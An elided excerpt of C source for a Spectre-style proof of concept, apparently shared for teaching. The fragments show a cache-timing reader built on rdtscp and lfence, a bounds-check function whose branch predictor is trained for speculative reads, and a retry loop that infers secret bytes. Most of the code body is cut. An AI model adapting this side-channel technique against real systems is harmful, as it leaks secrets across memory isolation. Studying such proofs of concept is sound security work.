 ...
 * it as been posted in order to make it availabel for the 
...
//this is the max numebr of false negatives that we accept while
...
int memory_reader(void * target_address){//this function prints the value of the bytes in secret_area without accessing them
	...
	for(i=0;i<256;i++){
		...
		asm("lfence":::);
		time2 = __rdtscp( & junk);
		if( ((time2 - time1) < threshold) && (i!=0)){// we are not interestred on its on the 0-th page since this has been used for training
...
void side_effect_maker(size_t x){
	...
	//after branch predition training you can actually use any displacemenmt 
	//you woul like to deduce the value of bytes in memory
	if (x< array1_size){
...
int main (int argc, char**argv){
	...
	//one page is used as auxiliary buffer theother actually keeps the secret word
	...
	secret_area[0] = '\0'; //materialize the 0-th page of the area - specila value 0 is exploited in the cache-side channel inspection
	...
	for(z=0;z<bytes_to_infer;z++){
		...
		residual_retries = RETRY_CYCLES;//trying the sude effect multiple times for a same target memory byte in order to try to bypass false negatives
...
retry:
		...
		for(j = 29; j >= 0 ; j--){
			...
			//start of code block litterally taken by the orginal Spectre coder
			...
			//end of the code block literally taken by the orignal Spectre coder
